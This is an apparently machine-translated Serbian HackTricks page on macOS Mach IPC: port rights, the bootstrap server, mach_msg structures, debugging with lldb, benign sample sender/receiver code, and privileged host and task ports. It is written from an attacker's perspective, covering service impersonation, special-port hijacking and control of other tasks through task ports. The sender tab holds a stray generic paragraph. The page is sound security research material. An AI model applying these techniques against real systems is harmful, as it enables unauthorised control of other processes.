# macOS IPC - Inter Process Communication

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodiču PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Mach poruke putem portova

### Osnovne informacije

Mach koristi **taskove** kao **najmanju jedinicu** za deljenje resursa, pri čemu svaki task može sadržati **više niti**. Ovi **taskovi i niti su mapirani 1:1 na POSIX procese i niti**.

Komunikacija između taskova se odvija putem Mach Inter-Process Communication (IPC), koristeći jednosmjerne komunikacione kanale. **Poruke se prenose između portova**, koji deluju kao vrste **redova poruka** upravljanih od strane jezgra.

**Port** je **osnovni** element Mach IPC-a. Može se koristiti za **slanje poruka i za njihovo primanje**.

Svaki proces ima **IPC tabelu**, u kojoj je moguće pronaći **mach portove procesa**. Ime mach porta zapravo predstavlja broj (pokazivač na jezgrovni objekat).

Proces takođe može poslati ime porta sa određenim pravima **drugom tasku** i jezgro će napraviti ovaj unos u **IPC tabeli drugog taska**.

### Prava portova

Prava portova, koja definišu koje operacije task može izvršiti, ključna su za ovu komunikaciju. Moguća **prava portova** su ([definicije odavde](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

* **Pravo primanja**, koje omogućava primanje poruka poslatih portu. Mach portovi su MPSC (multiple-producer, single-consumer) redovi, što znači da može postojati samo **jedno pravo primanja za svaki port** u celom sistemu (za razliku od cevi, gde više procesa može držati deskriptore fajlova za čitanje sa jednog kraja cevi).
* Task sa **pravom primanja** može primati poruke i **kreirati prava slanja**, omogućavajući mu slanje poruka. Originalno, samo **sopstveni task ima pravo primanja nad svojim portom**.
* Ako vlasnik prava primanja **umre** ili ga ubije, **pravo slanja postaje beskorisno (mrtvo ime)**.
* **Pravo slanja**, koje omogućava slanje poruka portu.
* Pravo slanja se može **klonirati** tako da task koji poseduje pravo slanja može klonirati pravo i **dodeliti ga trećem tasku**.
* Imajte na umu da se **prava portova** takođe mogu **prosleđivati** putem Mac poruka.
* **Pravo slanja jednom**, koje omogućava slanje jedne poruke portu i zatim nestaje.
* Ovo pravo **ne može** biti **klonirano**, ali se može **premestiti**.
* **Pravo skupa portova**, koje označava _skup portova_ umesto jednog porta. Izvlačenje poruke iz skupa portova izvlači poruku iz jednog od portova koje sadrži. Skupovi portova se mogu koristiti za osluškivanje više portova istovremeno, slično kao `select`/`poll`/`epoll`/`kqueue` u Unix-u.
* **Mrtvo ime**, koje nije stvarno pravo porta, već samo rezervacija. Kada se port uništi, sva postojeća prava porta na port postaju mrtva imena.

**Taskovi mogu preneti SEND prava drugima**, omogućavajući im da pošalju poruke nazad. **SEND prava takođe mogu biti klonirana, tako da task može duplicirati i dati pravo trećem tasku**. Ovo, zajedno sa posredničkim procesom poznatim kao **bootstrap server**, omogućava efikasnu komunikaciju između taskova.

### Portovi fajlova

Portovi fajlova omogućavaju da se deskriptori fajlova enkapsuliraju u Mac portove (koristeći prava Mach porta). Moguće je kreirati `fileport` od datog FD koristeći `fileport_makeport` i kreirati FD iz fileporta koristeći `fileport_makefd`.

### Uspostavljanje komunikacije

Kao što je ranije pomenuto, moguće je slati prava koristeći Mach poruke, međutim, **ne možete poslati pravo bez već postojećeg prava** za slanje Mach poruke. Kako se onda uspostavlja prva komunikacija?

Za to je uključen **bootstrap server** (**launchd** na Mac-u), pošto **svako može dobiti SEND pravo ka bootstrap serveru**, moguće je zatražiti od njega pravo za slanje poruke drugom procesu:

1. Task **A** kreira **novi port**, dobijajući **pravo primanja** nad njim.
2. Task **A**, kao nosilac prava primanja, **generiše SEND pravo za port**.
3. Task **A** uspostavlja **vezu** sa **bootstrap serverom**, i **šalje mu SEND pravo** za port koji je generisao na početku.
* Zapamtite da svako može dobiti SEND pravo ka bootstrap serveru.
4. Task A šalje poruku `bootstrap_register` bootstrap serveru da **poveže dati port sa imenom** kao što je `com.apple.taska`
5. Task **B** interaguje sa **bootstrap serverom** da izvrši bootstrap **pretragu za imenom servisa** (`bootstrap_lookup`). Da bi bootstrap server mogao da odgovori, task B će mu poslati **SEND pravo ka portu koji je prethodno kreirao** unutar poruke pretrage. Ako je pretraga uspešna, **server duplira SEND pravo** primljeno od Task A i **prebacuje ga Task B**.
* Zapamtite da svako može dobiti SEND pravo ka bootstrap serveru.
6. Sa ovim SEND pravom, **Task B** je sposoban da **pošalje poruku Task A**.
7. Za dvosmernu komunikaciju obično task **B** generiše novi port sa **pravom primanja** i **pravom slanja**, i daje **pravo slanja Task A** tako da može slati poruke TASK B (dvosmerna komunikacija).

Bootstrap server **ne može autentifikovati** ime servisa koje tvrdi task. Ovo znači da bi **task** potencijalno mogao **predstavljati bilo koji sistemski task**, kao što je lažno **tvrditi ime autorizacionog servisa** a zatim odobravati svaki zahtev.

Zatim, Apple čuva **imena sistema pruženih servisa** u sigurnim konfiguracionim fajlovima, smeštenim u **SIP-zaštićenim** direktorijumima: `/System/Library/LaunchDaemons` i `/System/Library/LaunchAgents`. Pored svakog imena servisa, takođe je sačuvana **povezana binarna datoteka**. Bootstrap server će kreirati i držati **pravo primanja za svako od ovih imena servisa**.

Za ove unapred definisane servise, **proces pretrage se malo razlikuje**. Kada se traži ime servisa, launchd pokreće servis dinamički. Novi tok rada je sledeći:

* Task **B** pokreće bootstrap **pretragu** za imenom servisa.
* **launchd** proverava da li je task pokrenut i ako nije, ga **pokreće**.
* Task **A** (servis) izvršava **bootstrap check-in** (`bootstrap_check_in()`). Ovde, **bootstrap** server kreira SEND pravo, zadržava ga, i **prebacuje pravo primanja Task A**.
* launchd duplira **SEND pravo i šalje ga Task B**.
* Task **B** generiše novi port sa **pravom primanja** i **pravom slanja**, i daje **pravo slanja Task A** (servisu) tako da može slati poruke TASK B (dvosmerna komunikacija).

Međutim, ovaj proces se odnosi samo na unapred definisane sistemski taskove. Ne-sistemski taskovi i dalje funkcionišu kao što je opisano originalno, što potencijalno može omogućiti predstavljanje.

{% hint style="danger" %}
Stoga, launchd nikada ne sme da se sruši ili će ceo sistem pasti.
{% endhint %}
### Mach poruka

[Pronađi više informacija ovde](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

Funkcija `mach_msg`, suštinski sistemski poziv, koristi se za slanje i primanje Mach poruka. Funkcija zahteva da poruka bude poslata kao početni argument. Ova poruka mora početi sa strukturom `mach_msg_header_t`, praćenom stvarnim sadržajem poruke. Struktura je definisana na sledeći način:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Procesi koji poseduju _**pravo na prijem**_ mogu primati poruke na Mach portu. Nasuprot tome, **pošiljaoci** imaju _**pravo slanja**_ ili _**pravo jednokratnog slanja**_. Pravo jednokratnog slanja je isključivo za slanje jedne poruke, nakon čega postaje nevažeće.

Početno polje **`msgh_bits`** je mapa bitova:

- Prvi bit (najznačajniji) se koristi za označavanje da je poruka složena (više o tome ispod)
- 3. i 4. bit se koriste od strane jezgra
- **5 najmanje značajnih bitova 2. bajta** mogu se koristiti za **vaučer**: druga vrsta porta za slanje kombinacija ključ/vrednost.
- **5 najmanje značajnih bitova 3. bajta** mogu se koristiti za **lokalni port**
- **5 najmanje značajnih bitova 4. bajta** mogu se koristiti za **udaljeni port**

Tipovi koji se mogu navesti u vaučeru, lokalnim i udaljenim portovima su (iz [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
Na primer, `MACH_MSG_TYPE_MAKE_SEND_ONCE` može se koristiti da **ukazuje** da bi trebalo izvesti i preneti **jednokratno slanje prava** za ovaj port. Takođe se može specificirati `MACH_PORT_NULL` da bi se sprečilo da primalac može da odgovori.

Da bi se postigla jednostavna **dvosmerna komunikacija**, proces može specificirati **mach port** u mach **zaglavlju poruke** nazvanom _reply port_ (**`msgh_local_port`**) gde **primalac** poruke može **poslati odgovor** na ovu poruku.

{% hint style="success" %}
Imajte na umu da se ovakva vrsta dvosmerne komunikacije koristi u XPC porukama koje očekuju odgovor (`xpc_connection_send_message_with_reply` i `xpc_connection_send_message_with_reply_sync`). Ali **obično se kreiraju različiti portovi** kako je objašnjeno ranije da bi se kreirala dvosmerna komunikacija.
{% endhint %}

Ostala polja zaglavlja poruke su:

- `msgh_size`: veličina celog paketa.
- `msgh_remote_port`: port preko kog je poslata ova poruka.
- `msgh_voucher_port`: [mach vaučeri](https://robert.sesek.com/2023/6/mach\_vouchers.html).
- `msgh_id`: ID ove poruke, koji tumači primalac.

{% hint style="danger" %}
Imajte na umu da se **mach poruke šalju preko `mach porta`**, koji je **kanal komunikacije sa jednim primaocem**, **više pošiljalaca** ugrađen u mach kernel. **Više procesa** može **slati poruke** ka mach portu, ali u svakom trenutku samo **jedan proces može čitati** iz njega.
{% endhint %}

Poruke se zatim formiraju **`mach_msg_header_t`** zaglavljem praćenim **telom** i **trailerom** (ako postoji) i može dozvoliti odobrenje za odgovor na nju. U tim slučajevima, kernel samo treba da prosledi poruku od jednog zadatka drugom.

**Trailer** je **informacija dodata poruci od strane kernela** (ne može je postaviti korisnik) koja se može zatražiti prilikom prijema poruke sa zastavicom `MACH_RCV_TRAILER_<trailer_opt>` (postoji različite informacije koje se mogu zatražiti).

#### Kompleksne Poruke

Međutim, postoje i druge više **kompleksne** poruke, poput onih koje prenose dodatna prava porta ili dele memoriju, gde kernel takođe mora da pošalje ove objekte primaocu. U ovim slučajevima, najznačajniji bit zaglavlja `msgh_bits` je postavljen.

Mogući deskriptori za prenos su definisani u [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
U 32 bitnom režimu, svi deskriptori su 12B i tip deskriptora je u 11. U 64 bitnom režimu, veličine variraju.

{% hint style="opasnost" %}
Kernel će kopirati deskriptore iz jednog zadatka u drugi, ali prvo **kreira kopiju u jezgrovnoj memoriji**. Ova tehnika, poznata kao "Feng Shui", zloupotrebljena je u nekoliko eksploatacija kako bi naterala **kernel da kopira podatke u svojoj memoriji**, omogućavajući procesu da šalje deskriptore sebi. Zatim proces može primati poruke (kernel će ih osloboditi).

Takođe je moguće **poslati prava porta ranjivom procesu**, i prava porta će se jednostavno pojaviti u procesu (čak i ako ih ne obrađuje).
{% endhint %}

### Mac Ports API

Imajte na umu da su portovi povezani sa imenikom zadatka, pa prilikom kreiranja ili pretrage porta, takođe se pretražuje imenik zadatka (više u `mach/mach_port.h`):

* **`mach_port_allocate` | `mach_port_construct`**: **Kreirajte** port.
* `mach_port_allocate` takođe može kreirati **skup portova**: primi pravo nad grupom portova. Svaki put kada se primi poruka, naznačen je port sa kog je poslata.
* `mach_port_allocate_name`: Promenite ime porta (podrazumevano 32-bitni ceo broj)
* `mach_port_names`: Dobijte imena portova iz cilja
* `mach_port_type`: Dobijte prava zadatka nad imenom
* `mach_port_rename`: Preimenujte port (kao dup2 za FD-ove)
* `mach_port_allocate`: Alocirajte novi PRIMI, PORT\_SET ili DEAD\_NAME
* `mach_port_insert_right`: Kreirajte novo pravo u portu gde imate PRIMI
* `mach_port_...`
* **`mach_msg`** | **`mach_msg_overwrite`**: Funkcije korišćene za **slanje i primanje mach poruka**. Verzija za prepisivanje omogućava da se navede drugi bafer za prijem poruke (druga verzija će ga samo ponovo koristiti).

### Debug mach\_msg

Pošto su funkcije **`mach_msg`** i **`mach_msg_overwrite`** one koje se koriste za slanje i primanje poruka, postavljanje prekidača na njih omogućilo bi inspekciju poslatih i primljenih poruka.

Na primer, počnite sa debagovanjem bilo koje aplikacije koju možete da debagujete jer će učitati **`libSystem.B` koja će koristiti ovu funkciju**.

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Prekid 1: gde = libsystem_kernel.dylib`mach_msg, adresa = 0x00000001803f6c20
<strong>(lldb) r
</strong>Proces 71019 pokrenut: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Proces 71019 zaustavljen
* nit #1, red = 'com.apple.main-thread', razlog zaustavljanja = prekid 1.1
okvir #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 &#x3C;+0>:  pacibsp
0x181d3ac24 &#x3C;+4>:  sub    sp, sp, #0x20
0x181d3ac28 &#x3C;+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c &#x3C;+12>: add    x29, sp, #0x10
Cilj 0: (SandboxedShellApp) zaustavljen.
<strong>(lldb) bt
</strong>* nit #1, red = 'com.apple.main-thread', razlog zaustavljanja = prekid 1.1
* okvir #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
okvir #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
okvir #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
okvir #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
okvir #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
okvir #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
okvir #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
okvir #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
okvir #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
okvir #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&#x26;) const::$_0::operator()() const + 168
</code></pre>

Da biste dobili argumente **`mach_msg`**, proverite registre. Ovo su argumenti (iz [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
Dobijanje vrednosti iz registara:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
Pregledajte zaglavlje poruke proveravajući prvi argument:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
Taj tip `mach_msg_bits_t` je vrlo čest kako bi se omogućio odgovor.



### Nabroj portove
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
**Ime** je podrazumevano ime dodeljeno portu (proverite kako se **povećava** u prva 3 bajta). **`ipc-object`** je **zamagljeni** jedinstveni **identifikator** porta.\
Takođe obratite pažnju kako portovi sa samo **`send`** pravom **identifikuju vlasnika** istog (ime porta + pid).\
Takođe obratite pažnju na upotrebu **`+`** za označavanje **drugih zadataka povezanih sa istim portom**.

Takođe je moguće koristiti [**procesxp**](https://www.newosxbook.com/tools/procexp.html) da biste videli i **registrovana imena servisa** (sa onemogućenim SIP-om zbog potrebe za `com.apple.system-task-port`):
```
procesp 1 ports
```
Možete instalirati ovaj alat u iOS preuzimanjem sa [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Primer koda

Obratite pažnju kako **pošiljalac** **dodeljuje** port, kreira **send right** za ime `org.darlinghq.example` i šalje ga **bootstrap serveru** dok je pošiljalac zatražio **send right** za to ime i koristio ga je da **pošalje poruku**.

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% endtab %}

{% tab title="sender.c" %}Ukoliko želite da pošaljete poruku primaocu, možete koristiti inter-procesnu komunikaciju (IPC) na macOS-u. IPC omogućava komunikaciju između procesa na istom ili različitim računarskim sistemima. Na macOS-u, IPC se može postići korišćenjem različitih mehanizama kao što su Mach ports, XPC services, Unix domain sockets, i drugi. Korišćenje IPC-a za komunikaciju između procesa može biti korisno, ali takođe može predstavljati sigurnosne rizike ako se ne koristi pažljivo. {% endtab %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{% endtab %}
{% endtabs %}

## Privilegovani portovi

Postoje neki posebni portovi koji omogućavaju **izvođenje određenih osetljivih radnji ili pristup određenim osetljivim podacima** u slučaju da zadaci imaju **dozvole za slanje (SEND)** nad njima. Ovo čini ove portove vrlo zanimljivim iz perspektive napadača ne samo zbog mogućnosti već i zato što je moguće **deliti dozvole za slanje između zadataka**.

### Specijalni portovi domaćina

Ovi portovi su predstavljeni brojevima.

**Prava za slanje (SEND)** mogu se dobiti pozivanjem **`host_get_special_port`** i prava za **PRIJEM (RECEIVE)** pozivanjem **`host_set_special_port`**. Međutim, oba poziva zahtevaju **port `host_priv`** koji može pristupiti samo root. Osim toga, u prošlosti je root mogao pozvati **`host_set_special_port`** i oteti proizvoljne koji su omogućavali na primer zaobilaženje potpisa koda otimanjem `HOST_KEXTD_PORT` (SIP sada sprečava ovo).

Oni su podeljeni u 2 grupe: **Prvih 7 portova su u vlasništvu jezgra** pri čemu je 1 `HOST_PORT`, 2 `HOST_PRIV_PORT`, 3 `HOST_IO_MASTER_PORT`, a 7 je `HOST_MAX_SPECIAL_KERNEL_PORT`.\
Oni koji počinju **od broja 8** su **u vlasništvu sistemskih demona** i mogu se pronaći deklarisani u [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host\_special\_ports.h.auto.html).

* **Host port**: Ako proces ima **privilegiju slanja (SEND)** nad ovim portom, može dobiti **informacije** o **sistemu** pozivanjem njegovih rutina poput:
* `host_processor_info`: Dobijanje informacija o procesoru
* `host_info`: Dobijanje informacija o domaćinu
* `host_virtual_physical_table_info`: Virtuelna/fizička tabela stranica (zahteva MACH\_VMDEBUG)
* `host_statistics`: Dobijanje statistika domaćina
* `mach_memory_info`: Dobijanje rasporeda memorije jezgra
* **Host Priv port**: Proces sa **pravom slanja (SEND)** nad ovim portom može izvršiti **privilegovane radnje** poput prikazivanja podataka o pokretanju ili pokušaja učitavanja proširenja jezgra. **Proces mora biti root** da bi dobio ovu dozvolu.
* Osim toga, da bi pozvao **`kext_request`** API, potrebno je imati druge privilegije **`com.apple.private.kext*`** koje se dodeljuju samo Apple binarnim datotekama.
* Druge rutine koje se mogu pozvati su:
* `host_get_boot_info`: Dobijanje `machine_boot_info()`
* `host_priv_statistics`: Dobijanje privilegovanih statistika
* `vm_allocate_cpm`: Alokacija kontinualne fizičke memorije
* `host_processors`: Pravo slanja domaćinu procesora
* `mach_vm_wire`: Čini memoriju rezidentnom
* Pošto **root** može pristupiti ovoj dozvoli, mogao bi pozvati `host_set_[special/exception]_port[s]` da **otme specijalne ili izuzetne portove domaćina**.

Moguće je **videti sve specijalne portove domaćina** pokretanjem:
```bash
procexp all ports | grep "HSP"
```
### Posebni portovi

Ovo su portovi rezervisani za dobro poznate servise. Moguće je dobiti/postaviti ih pozivanjem `task_[get/set]_special_port`. Mogu se pronaći u `task_special_ports.h`:
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
Sa [ovde](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task\_get\_special\_port.html):

* **TASK\_KERNEL\_PORT**\[task-self send right]: Port koji se koristi za kontrolu ovog zadatka. Koristi se za slanje poruka koje utiču na zadatak. Ovo je port koji vraća **mach\_task\_self (vidi Task Ports ispod)**.
* **TASK\_BOOTSTRAP\_PORT**\[bootstrap send right]: Bootstrap port zadatka. Koristi se za slanje poruka koje zahtevaju povratak drugih sistema servisnih portova.
* **TASK\_HOST\_NAME\_PORT**\[host-self send right]: Port koji se koristi za zahtevanje informacija o sadržaju domaćina. Ovo je port koji vraća **mach\_host\_self**.
* **TASK\_WIRED\_LEDGER\_PORT**\[ledger send right]: Port koji imenuje izvor iz kojeg ovaj zadatak crpi svoju žičanu jezgru memorije.
* **TASK\_PAGED\_LEDGER\_PORT**\[ledger send right]: Port koji imenuje izvor iz kojeg ovaj zadatak crpi svoju podrazumevanu memoriju upravljane memorije.

### Task Ports

Originalno, Mach nije imao "procese", već "zadatke" koji su se smatrali više kao kontejneri niti. Kada je Mach spojen sa BSD **svaki zadatak je bio povezan sa BSD procesom**. Stoga, svaki BSD proces ima detalje potrebne da bude proces, a svaki Mach zadatak takođe ima svoje unutrašnje funkcije (osim nepostojećeg pid 0 koji je `kernel_task`).

Postoje dve veoma interesantne funkcije koje su povezane sa ovim:

* `task_for_pid(target_task_port, pid, &task_port_of_pid)`: Dobijanje SEND prava za zadatak povezan sa određenim `pid` i davanje toga zadatka navedenom `target_task_port` (koji je obično pozivački zadatak koji je koristio `mach_task_self()`, ali može biti SEND port preko drugog zadatka.)
* `pid_for_task(task, &pid)`: Dajući SEND pravo zadatku, pronađi sa kojim PID-om je taj zadatak povezan.

Da bi izvršio radnje unutar zadatka, zadatak je trebao `SEND` pravo sebi pozivajući `mach_task_self()` (koji koristi `task_self_trap` (28)). Sa ovlašćenjem, zadatak može izvršiti nekoliko radnji kao što su:

* `task_threads`: Dobijanje SEND prava nad svim zadacima niti zadatka
* `task_info`: Dobijanje informacija o zadatku
* `task_suspend/resume`: Pauziranje ili nastavljanje zadatka
* `task_[get/set]_special_port`
* `thread_create`: Kreiranje niti
* `task_[get/set]_state`: Kontrola stanja zadatka
* i još se može naći u [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)

{% hint style="danger" %}
Primetite da sa SEND pravom nad zadatkom drugog zadatka, moguće je izvršiti takve radnje nad drugim zadatkom.
{% endhint %}

